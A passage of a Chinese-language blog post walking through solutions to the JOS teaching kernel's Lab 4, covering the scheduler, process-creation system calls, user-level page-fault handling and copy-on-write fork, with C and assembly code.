class="hljs-comment">// Search through 'envs' for an ENV_RUNNABLE environment in</span><span class="hljs-comment">// circular fashion starting just after the env this CPU was</span><span class="hljs-comment">// last running.  Switch to the first such environment found.</span><span class="hljs-comment">//</span><span class="hljs-comment">// If no envs are runnable, but the environment previously</span><span class="hljs-comment">// running on this CPU is still ENV_RUNNING, it's okay to</span><span class="hljs-comment">// choose that environment.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Never choose an environment that's currently running on</span><span class="hljs-comment">// another CPU (env_status == ENV_RUNNING). If there are</span><span class="hljs-comment">// no runnable environments, simply drop through to the code</span><span class="hljs-comment">// below to halt the cpu.</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">int</span> start = <span class="hljs-number">0</span>;<span class="hljs-keyword">int</span> j;<span class="hljs-keyword">if</span> (curenv) &#123;start = ENVX(curenv-&gt;env_id) + <span class="hljs-number">1</span>;<span class="hljs-comment">//从当前Env结构的后一个开始查找</span>&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NENV; i++) &#123;j = (start + i) % NENV;<span class="hljs-keyword">if</span> (envs[j].env_status == ENV_RUNNABLE) &#123;<span class="hljs-comment">//找到可以作为下一个运行的进程</span>env_run(&amp;envs[j]);&#125;&#125;<span class="hljs-keyword">if</span> (curenv &amp;&amp; curenv-&gt;env_status == ENV_RUNNING) &#123;env_run(curenv);&#125;<span class="hljs-comment">// sched_halt never returns</span>sched_halt();&#125;</code></pre><p>之后再<code>kern/syscall.c</code>里面加入对应的情况</p><pre><code class="hljs c++"><span class="hljs-keyword">case</span> SYS_yield:ret = <span class="hljs-number">0</span>;sys_yield();<span class="hljs-keyword">break</span>;</code></pre><p>在<code>kern/init.c</code>中的用户进程进行修改</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> defined(TEST)</span><span class="hljs-comment">// Don't touch -- used by grading script!</span>ENV_CREATE(TEST, ENV_TYPE_USER);<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><span class="hljs-comment">// Touch all you want.</span>ENV_CREATE(user_yield, ENV_TYPE_USER);ENV_CREATE(user_yield, ENV_TYPE_USER);ENV_CREATE(user_yield, ENV_TYPE_USER);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// TEST*</span></span><span class="hljs-comment">// Schedule and run the first user environment!</span>sched_yield();</code></pre><p><strong>进程创建的系统调用</strong></p><p>现在要实现新的系统调用，该系统调用允许创建进程并且运行新的进程，具体要实现的系统调用如下</p><ul><li>sys_exofork：创建一个新的进程，寄存器与父进程一样，在父进程中返回值为子进程的envid，而在子进程当中返回值为0</li><li>sys_env_set_status：设置一个特定进程的状态为ENV_RUNNABLE或者ENV_NOT_RUNNABLE</li><li>sys_page_alloc：为指定进程分配物理页</li><li>sys_page_map：拷贝页表，使得指定进程能够和当前进程有相同的映射关系</li><li>sys_page_unmap：接触页映射关系</li></ul><h3 id="Exercise-7"><a href="#Exercise-7" class="headerlink" title="Exercise 7"></a>Exercise 7</h3><blockquote><p>Implement the system calls described above in <code>kern/syscall.c</code>. You will need to use various functions in <code>kern/pmap.c</code> and <code>kern/env.c</code>, particularly <code>envid2env()</code>. For now, whenever you call <code>envid2env()</code>, pass 1 in the <code>checkperm</code> parameter. Be sure you check for any invalid system call arguments, returning <code>-E_INVAL</code> in that case. Test your JOS kernel with <code>user/dumbfork</code> and make sure it works before proceeding.</p></blockquote><p>按照上面的来实现对应的系统调用，该联系重点是<code>user/dumbfork.c</code>里面的duppage（）函数，它利用 <code>sys_page_alloc()</code> 为子进程分配空闲物理页，再使用<code>sys_page_map()</code> 将该新物理页映射到内核的交换区 <code>UTEMP</code>，方便在内核态进行拷贝操作。在拷贝结束后，利用 <code>sys_page_unmap()</code> 将交换区的映射删除。</p><ul><li><p><strong>sys_exofork（）函数</strong></p><p>  在该函数中，子进程复制了父进程的 trapframe，此后把 trapframe 中的 eax 的值设为了0。最后，返回了子进程的 id。</p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">envid_t</span>sys_exofork(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// Create the new environment with env_alloc(), from kern/env.c.</span><span class="hljs-comment">// It should be left as env_alloc created it, except that</span><span class="hljs-comment">// status is set to ENV_NOT_RUNNABLE, and the register set is copied</span><span class="hljs-comment">// from the current environment -- but tweaked so sys_exofork</span><span class="hljs-comment">// will appear to return 0.</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_exofork not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> ret = env_alloc(&amp;e, curenv-&gt;env_id);    <span class="hljs-comment">//分配一个Env结构</span><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> ret;&#125;e-&gt;env_tf = curenv-&gt;env_tf;<span class="hljs-comment">//寄存器状态保持一致</span>e-&gt;env_status = ENV_NOT_RUNNABLE;    <span class="hljs-comment">//不能运行</span>e-&gt;env_tf.tf_regs.reg_eax = <span class="hljs-number">0</span>;         <span class="hljs-comment">//新进程的返回值为0</span><span class="hljs-keyword">return</span> e-&gt;env_id;&#125;</code></pre></li><li><p><strong>sys_page_alloc（）</strong></p><p>  在进程envid的地址va分配一个权限为perm的页面</p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_page_alloc(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">void</span> *va, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// Hint: This function is a wrapper around page_alloc() and</span><span class="hljs-comment">//   page_insert() from kern/pmap.c.</span><span class="hljs-comment">//   Most of the new code you write should be to check the</span><span class="hljs-comment">//   parameters for correctness.</span><span class="hljs-comment">//   If page_insert() fails, remember to free the page you</span><span class="hljs-comment">//   allocated!</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_page_alloc not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> ret = envid2env(envid, &amp;e, <span class="hljs-number">1</span>);   <span class="hljs-comment">//envid对应的env结构</span><span class="hljs-keyword">if</span> ((va &gt;= (<span class="hljs-keyword">void</span>*)UTOP) || (ROUNDDOWN(va, PGSIZE) != va)) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">int</span> flag = PTE_U | PTE_P;<span class="hljs-keyword">if</span> ((perm &amp; flag) != flag) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pg</span> = <span class="hljs-title">page_alloc</span>(1);</span>     <span class="hljs-comment">//分配物理页</span><span class="hljs-keyword">if</span> (!pg) <span class="hljs-keyword">return</span> -E_NO_MEM;      <span class="hljs-comment">//未分配成功</span>ret = page_insert(e-&gt;env_pgdir, pg, va, perm);<span class="hljs-comment">//建立映射关系</span><span class="hljs-keyword">if</span> (ret) &#123;page_free(pg);<span class="hljs-keyword">return</span> ret;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></li><li><p><strong>sys_page_map（）函数</strong></p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_page_map(<span class="hljs-keyword">envid_t</span> srcenvid, <span class="hljs-keyword">void</span> *srcva,     <span class="hljs-keyword">envid_t</span> dstenvid, <span class="hljs-keyword">void</span> *dstva, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// Hint: This function is a wrapper around page_lookup() and</span><span class="hljs-comment">//   page_insert() from kern/pmap.c.</span><span class="hljs-comment">//   Again, most of the new code you write should be to check the</span><span class="hljs-comment">//   parameters for correctness.</span><span class="hljs-comment">//   Use the third argument to page_lookup() to</span><span class="hljs-comment">//   check the current permissions on the page.</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_page_map not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">se</span>, *<span class="hljs-title">de</span>;</span>           <span class="hljs-comment">//开始找对应的env结构</span><span class="hljs-keyword">int</span> ret = envid2env(srcenvid, &amp;se, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (ret) <span class="hljs-keyword">return</span> ret;ret = envid2env(dstenvid, &amp;de, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (ret) <span class="hljs-keyword">return</span> ret;<span class="hljs-comment">//之后是相关的条件的判断</span><span class="hljs-keyword">if</span> (srcva &gt;= (<span class="hljs-keyword">void</span>*)UTOP || dstva &gt;= (<span class="hljs-keyword">void</span>*)UTOP || ROUNDDOWN(srcva,PGSIZE) != srcva || ROUNDDOWN(dstva,PGSIZE) != dstva) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">pte_t</span> *pte;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pg</span> = <span class="hljs-title">page_lookup</span>(<span class="hljs-title">se</span>-&gt;<span class="hljs-title">env_pgdir</span>, <span class="hljs-title">srcva</span>, &amp;<span class="hljs-title">pte</span>);</span><span class="hljs-keyword">if</span> (!pg) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">int</span> flag = PTE_U|PTE_P;<span class="hljs-keyword">if</span> ((perm &amp; flag) != flag) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span> (((*pte&amp;PTE_W) == <span class="hljs-number">0</span>) &amp;&amp; (perm&amp;PTE_W)) <span class="hljs-keyword">return</span> -E_INVAL;ret = page_insert(de-&gt;env_pgdir, pg, dstva, perm);<span class="hljs-keyword">return</span> ret;&#125;</code></pre></li><li><p><strong>sys_page_ummap（）</strong></p><p>  就是映射关系的清除，可以通过page_remove（）来实现</p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_page_unmap(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">void</span> *va)&#123;<span class="hljs-comment">// Hint: This function is a wrapper around page_remove().</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_page_unmap not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env</span>;</span><span class="hljs-keyword">int</span> ret = envid2env(envid, &amp;env, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (ret) <span class="hljs-keyword">return</span> ret;<span class="hljs-keyword">if</span> ((va &gt;= (<span class="hljs-keyword">void</span>*)UTOP) || (ROUNDDOWN(va, PGSIZE) != va)) <span class="hljs-keyword">return</span> -E_INVAL;page_remove(env-&gt;env_pgdir, va);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></li><li><p><strong>sys_env_set_status（）</strong></p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_env_set_status(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">int</span> status)&#123;<span class="hljs-comment">// Hint: Use the 'envid2env' function from kern/env.c to translate an</span><span class="hljs-comment">// envid to a struct Env.</span><span class="hljs-comment">// You should set envid2env's third argument to 1, which will</span><span class="hljs-comment">// check whether the current environment has permission to set</span><span class="hljs-comment">// envid's status.</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_env_set_status not implemented");</span><span class="hljs-keyword">if</span> (status != ENV_NOT_RUNNABLE &amp;&amp; status != ENV_RUNNABLE) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> ret = envid2env(envid, &amp;e, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> ret;e-&gt;env_status = status;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></li><li><p><strong>在<code>kern/syscall.c</code>里面添加新的系统调用</strong></p>  <pre><code class="hljs c++"><span class="hljs-keyword">case</span> SYS_exofork:ret = sys_exofork();<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> SYS_env_set_status:ret = sys_env_set_status((<span class="hljs-keyword">envid_t</span>)a1, (<span class="hljs-keyword">int</span>)a2);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> SYS_page_alloc:ret = sys_page_alloc((<span class="hljs-keyword">envid_t</span>)a1, (<span class="hljs-keyword">void</span> *)a2, (<span class="hljs-keyword">int</span>)a3);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> SYS_page_map:ret = sys_page_map((<span class="hljs-keyword">envid_t</span>)a1, (<span class="hljs-keyword">void</span> *)a2,(<span class="hljs-keyword">envid_t</span>)a3, (<span class="hljs-keyword">void</span> *)a4, (<span class="hljs-keyword">int</span>)a5);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> SYS_page_unmap:ret = sys_page_unmap((<span class="hljs-keyword">envid_t</span>)a1, (<span class="hljs-keyword">void</span> *)a2);<span class="hljs-keyword">break</span>;</code></pre></li></ul><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><h3 id="Exercise-8"><a href="#Exercise-8" class="headerlink" title="Exercise 8"></a>Exercise 8</h3><blockquote><p>Exercise 8. Implement the sys_env_set_pgfault_upcall system call. Be sure to enable permission checking when looking up the environment ID of the target environment, since this is a “dangerous” system call.</p></blockquote><p><strong>sys_env_set_pgfault_upcall（）</strong></p><p>这个系统调用为一个进程设置其用户态的页错误处理函数，当对参数进行检查之后，设置<code>env-&gt;env_pgfault_upcall</code>项即可。</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_env_set_pgfault_upcall(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">void</span> *func)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_env_set_pgfault_upcall not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env</span>;</span><span class="hljs-keyword">int</span> ret;<span class="hljs-keyword">if</span> ((ret = envid2env(envid, &amp;env, <span class="hljs-number">1</span>)) &lt; <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> ret;&#125;env-&gt;env_pgfault_upcall = func;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h3 id="Exercise-9"><a href="#Exercise-9" class="headerlink" title="Exercise 9"></a>Exercise 9</h3><blockquote><p>Exercise 9. Implement the code in page_fault_handler in kern/trap.c required to dispatch page faults to the user-mode handler. Be sure to take appropriate precautions when writing into the exception stack. (What happens if the user environment runs out of space on the exception stack?)</p></blockquote><p>在这里，我们所需要做的是完善页错误处理函数，我们需要使用户进程遇到也错误<code>trap</code>进入kernel时，kernel能够让用户来运行处理函数</p><p>用户程序会用到自己的<code>Exception Stack</code>保存出现中断时的错误信息供处理程序使用，而这个函数就需要将中断时进程的寄存器信息等压入栈中，并运行用户的中断程序。JOS提供了一个结构<code>UTrapframe</code>保存所有要用到的终端信息，只需要在栈中的指定位置分配一块内存给<code>UTrapframe</code>，并将<code>Trapframe</code>的信息存入即可。需要注意用户进程已经在中断栈中运行和第一次触发中断两种情况，对应的<code>esp</code>位置和<code>UTrapframe</code>存放位置也会不同。</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>page_fault_handler(struct Trapframe *tf)&#123;<span class="hljs-keyword">uint32_t</span> fault_va;<span class="hljs-comment">// Read processor's CR2 register to find the faulting address</span>fault_va = rcr2();<span class="hljs-comment">// Handle kernel-mode page faults.</span><span class="hljs-comment">// LAB 3: Your code here.</span><span class="hljs-keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="hljs-number">3</span>) == <span class="hljs-number">0</span>)panic(<span class="hljs-string">"page_fault_handler():page fault in kernel mode!\n"</span>);<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">if</span> (curenv-&gt;env_pgfault_upcall) &#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UTrapframe</span> *<span class="hljs-title">utf</span>;</span><span class="hljs-keyword">uintptr_t</span> New_esp;<span class="hljs-comment">//判断是否已经在Exception Stack中</span><span class="hljs-keyword">if</span> (tf-&gt;tf_esp &gt; UXSTACKTOP - PGSIZE - <span class="hljs-number">1</span> &amp;&amp; tf-&gt;tf_esp &lt; UXSTACKTOP) &#123;New_esp = tf-&gt;tf_esp - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint32_t</span>) - <span class="hljs-keyword">sizeof</span>(struct UTrapframe);utf = (struct UTrapframe*)New_esp;&#125;<span class="hljs-keyword">else</span> &#123;New_esp = UXSTACKTOP - <span class="hljs-keyword">sizeof</span>(struct UTrapframe);utf = (struct UTrapframe*)New_esp;&#125;<span class="hljs-comment">//为UTrapframe赋具体值</span>user_mem_assert(curenv, (<span class="hljs-keyword">void</span> *) New_esp, <span class="hljs-keyword">sizeof</span>(struct UTrapframe), PTE_W | PTE_P | PTE_U);utf-&gt;utf_eflags = tf-&gt;tf_eflags;utf-&gt;utf_eip = tf-&gt;tf_eip;utf-&gt;utf_err = tf-&gt;tf_err;utf-&gt;utf_esp = tf-&gt;tf_esp;utf-&gt;utf_fault_va = fault_va;utf-&gt;utf_regs = tf-&gt;tf_regs;curenv-&gt;env_tf.tf_esp = New_esp;curenv-&gt;env_tf.tf_eip = (<span class="hljs-keyword">uintptr_t</span>)curenv-&gt;env_pgfault_upcall;env_run(curenv);&#125;<span class="hljs-comment">// Destroy the environment that caused the fault.</span>cprintf(<span class="hljs-string">"[%08x] user fault va %08x ip %08x\n"</span>,curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);print_trapframe(tf);env_destroy(curenv);&#125;</code></pre><h3 id="Exercise-10"><a href="#Exercise-10" class="headerlink" title="Exercise 10"></a>Exercise 10</h3><blockquote><p>Exercise 10. Implement the _pgfault_upcall routine in lib/pfentry.S. The interesting part is returning to the original point in the user code that caused the page fault. You’ll return directly there, without going back through the kernel. The hard part is simultaneously switching stacks and re-loading the EIP. </p></blockquote><p>要实现的<code>_pgfault_upcall（）</code>的作用是调用已经实现的页错误处理程序，并且在运行完处理程序之后返回到原来的进程中继续运行，同时在实现的时候由于返回过程中需要维护寄存器的信息，所以不能直接通过ret，jmp指令实现，而是通过mov来实现</p><pre><code class="hljs c++">.<span class="hljs-built_in">text</span>.globl _pgfault_upcall_pgfault_upcall:<span class="hljs-comment">// Call the C page fault handler.</span>pushl %esp<span class="hljs-comment">// function argument: pointer to UTF</span>movl _pgfault_handler, %eaxcall *%eaxaddl $<span class="hljs-number">4</span>, %esp<span class="hljs-comment">// pop function argument</span>        <span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// Restore the trap-time registers.  After you do this, you</span><span class="hljs-comment">// can no longer modify any general-purpose registers.</span><span class="hljs-comment">// LAB 4: Your code here.</span>addl $<span class="hljs-number">8</span>, %esp<span class="hljs-comment">// 跳过utf_fault_va和utf_err</span>movl <span class="hljs-number">40</span>(%esp), %eax <span class="hljs-comment">// 保存中断发生时的esp到eax</span>movl <span class="hljs-number">32</span>(%esp), %ecx <span class="hljs-comment">// 保存终端发生时的eip到ecx</span>movl %ecx, <span class="hljs-number">-4</span>(%eax) <span class="hljs-comment">// 将中断发生时的esp值亚入到到原来的栈中</span>popaladdl $<span class="hljs-number">4</span>, %esp<span class="hljs-comment">// 跳过eip</span><span class="hljs-comment">// Restore eflags from the stack.  After you do this, you can</span><span class="hljs-comment">// no longer use arithmetic operations or anything else that</span><span class="hljs-comment">// modifies eflags.</span><span class="hljs-comment">// LAB 4: Your code here.</span>popfl<span class="hljs-comment">// Switch back to the adjusted trap-time stack.</span><span class="hljs-comment">// LAB 4: Your code here.</span>popl %esp<span class="hljs-comment">// Return to re-execute the instruction that faulted.</span><span class="hljs-comment">// LAB 4: Your code here.</span>lea <span class="hljs-number">-4</span>(%esp), %esp<span class="hljs-comment">// 因为之前压入了eip的值但是没有减esp的值，所以现在需要将esp寄存器中的值减4</span>ret</code></pre><h3 id="Exercise-11"><a href="#Exercise-11" class="headerlink" title="Exercise 11"></a>Exercise 11</h3><blockquote><p>Exercise 11. Finish set_pgfault_handler() in lib/pgfault.c.</p></blockquote><p><code>set_pgfault_handle()</code>为一个进程设置其页错误处理程序。如果程序没有设置处理程序，那么需要调用<code>sys_page_alloc()</code>分配一块<code>Exception Stack</code>，并使用<code>sys_env_set_pgfault_upcall()</code>将中断入口设为完成的汇编程序，最后设置<code>_pagefault_handler()</code>为C语言实现的处理函数即可</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>set_pgfault_handler(<span class="hljs-keyword">void</span> (*handler)(struct UTrapframe *utf))&#123;<span class="hljs-keyword">int</span> r;<span class="hljs-keyword">if</span> (_pgfault_handler == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// First time through!</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("set_pgfault_handler not implemented");</span><span class="hljs-keyword">int</span> r = sys_page_alloc(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)(UXSTACKTOP-PGSIZE), PTE_W | PTE_U | PTE_P);<span class="hljs-comment">//分配异常栈</span><span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) &#123;panic(<span class="hljs-string">"set_pgfault_handler:sys_page_alloc failed"</span>);;&#125;sys_env_set_pgfault_upcall(<span class="hljs-number">0</span>, _pgfault_upcall);<span class="hljs-comment">//系统调用，设置进程的env_pgfault_upcall属性</span>&#125;<span class="hljs-comment">// Save handler pointer for assembly to call.</span>_pgfault_handler = handler;&#125;</code></pre><h3 id="Exercise-12"><a href="#Exercise-12" class="headerlink" title="Exercise 12"></a>Exercise 12</h3><blockquote><p>Exercise 12. Implement fork, duppage and pgfault in lib/fork.c.<br>Test your code with the forktree program. It should produce the following messages, with interspersed ‘new env’, ‘free env’, and ‘exiting gracefully’ messages. The messages may not appear in this order, and the environment IDs may be different.</p></blockquote><ul><li><p><strong>pgfault（）</strong></p><p>  该函数实现的是Copy On Write式的fork（）函数遇到也错误时候的处理程序，由于COW式的fork（）创建出来的子进程一开始就和父进程共享物理内存，因此，当父进程或者子进程要修改一个物理内存页的时候，需要新的一页物理内存来避免冲突</p><p>  判断一下参数合法与否，在这里与之前稍有不同的是还需要判断当前要处理的页是否是一个COW页，以及是否由于写操作引起的页错误。判断方式与之前相同（使用JOS定义好的<code>FEC_WR</code>测试<code>err</code>，使用<code>PTE_COW</code>检查页表项标志位）。</p><p>  随后首先用<code>sys_page_alloc()</code>为进程希望修改的COW页分配新的物理内存，再取消引发页错误的虚拟地址原有的映射，并将刚才映射在缓存区的新页映射给<code>addr</code>，最后取消缓存区的映射即可。中间每一步都需要检查是否有错误产生。</p></li></ul><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>pgfault(struct UTrapframe *utf)&#123;<span class="hljs-keyword">void</span> *addr = (<span class="hljs-keyword">void</span> *) utf-&gt;utf_fault_va;<span class="hljs-keyword">uint32_t</span> err = utf-&gt;utf_err;<span class="hljs-keyword">int</span> r;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">uint32_t</span> pgnum = PGNUM(addr);<span class="hljs-keyword">uint32_t</span> pgde = PDX(addr);<span class="hljs-keyword">envid_t</span> envid = sys_getenvid();<span class="hljs-keyword">if</span> (!((err&amp;FEC_WR) &amp;&amp; (uvpt[pgnum]&amp;PTE_COW) &amp;&amp; (uvpt[pgnum]&amp;PTE_P) &amp;&amp; (uvpd[pgde]&amp;PTE_P)))panic(<span class="hljs-string">"Page cannot be fixed\n"</span>);addr = ROUNDDOWN(addr,PGSIZE);<span class="hljs-keyword">if</span> (sys_page_alloc(envid,(<span class="hljs-keyword">void</span>*)PFTEMP,PTE_W|PTE_P|PTE_U) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_alloc panic\n"</span>);memmove(PFTEMP,addr,PGSIZE);<span class="hljs-keyword">if</span> (sys_page_unmap(envid,addr) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_unmap panic\n"</span>);<span class="hljs-keyword">if</span> (sys_page_map(envid, PFTEMP, envid, addr, PTE_P|PTE_U|PTE_W) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_map panic\n"</span>);<span class="hljs-keyword">if</span> (sys_page_unmap(envid,PFTEMP) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_unmap panic\n"</span>);&#125;</code></pre><ul><li><strong>deppage（）</strong></li></ul><p>该函数的作用式将虚拟内存也好为pn的虚拟内存映射到一个给定进程的相同虚拟空间，实现上只需要调用<code>sys_page_map()</code>即可</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>duppage(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">unsigned</span> pn)&#123;<span class="hljs-keyword">int</span> r;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">void</span> *addr = (<span class="hljs-keyword">void</span> *)(pn*PGSIZE);<span class="hljs-keyword">envid_t</span> thisenvid = sys_getenvid();<span class="hljs-keyword">if</span> ((uvpt[pn]&amp;PTE_W) || (uvpt[pn]&amp;PTE_COW)) &#123;<span class="hljs-keyword">if</span> (sys_page_map(thisenvid, addr, envid, addr, PTE_P|PTE_U|PTE_COW) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_map dupage"</span>);<span class="hljs-keyword">if</span> (sys_page_map(thisenvid, addr, thisenvid, addr, PTE_P|PTE_U|PTE_COW) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_map dupage"</span>);&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> (sys_page_map(thisenvid, addr, envid, addr, PTE_P|PTE_U) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_map dupage"</span>);&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><ul><li><strong>fork（）</strong></li></ul><p>一个进程调用这个<code>fork()</code>后，首先会将进程的页错误处理函数设置为刚才实现的COW专用页错误处理函数；随后调用<code>sys_exofork()</code>产生一个新的进程。但是这里产生的新进程仅仅是复制了父进程的寄存器信息，接下来需要完成子进程的内存映射。在父进程中，首先需要将<code>UTEXT</code>到Exception Stack之间的用户内存映射给子进程。这里要用到刚才实现的<code>duppage()</code>函数来进行逐页映射（需要处理COW）。随后要给这个进程分配自己的Exception Stack，并初始化其中断处理函数，最后将子进程状态设为<code>ENV_RUNNABLE</code>，返回子进程id。子进程中<code>fork()</code>返回0即可</p><pre><code class="hljs c++"><span class="hljs-keyword">envid_t</span>fork(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">uint32_t</span> err;set_pgfault_handler(pgfault); <span class="hljs-comment">// 缺页处理函数</span><span class="hljs-keyword">envid_t</span> envid = sys_exofork();<span class="hljs-comment">// 产生新的进程，设置了进程的状态，复制寄存器（TrapFrame）</span><span class="hljs-keyword">if</span> (envid == -E_NO_FREE_ENV ||envid == -E_NO_MEM)&#123;panic(<span class="hljs-string">"cannot allocate an environment for %e\n"</span>, envid);&#125;<span class="hljs-keyword">if</span> (envid &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">// 父进程</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint32_t</span> pn = PGNUM(UTEXT); pn &lt; PGNUM(UXSTACKTOP - PGSIZE); pn++)&#123;<span class="hljs-keyword">if</span> (((uvpd[PDX(pn*PGSIZE)]&amp;PTE_P) != PTE_P) || ((uvpt[pn]&amp;PTE_P) != PTE_P)) <span class="hljs-keyword">continue</span>;<span class="hljs-keyword">if</span> ((err = duppage(envid, pn)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"duppage err:%e\n"</span>, err);&#125;<span class="hljs-keyword">if</span> ((err = sys_page_alloc(envid, (<span class="hljs-keyword">void</span> *)(UXSTACKTOP - PGSIZE), PTE_P|PTE_U|PTE_W)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_alloc err:%e\n"</span>, err);<span class="hljs-keyword">extern</span> <span class="hljs-keyword">void</span> _pgfault_upcall();<span class="hljs-keyword">if</span> ((err =sys_env_set_pgfault_upcall(envid, _pgfault_upcall))&lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_env_set_pgfault_upcall err:%e\n"</span>, err);<span class="hljs-keyword">if</span> ((err = sys_env_set_status(envid, ENV_RUNNABLE)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_env_set_status err:%e\n"</span>, err);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//子进程</span>thisenv = &amp;envs[ENVX(sys_getenvid())];<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">return</span> envid;&#125;</code></pre><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><h3 id="Exercise-13"><a href="#Exercise-13" class="headerlink" title="Exercise 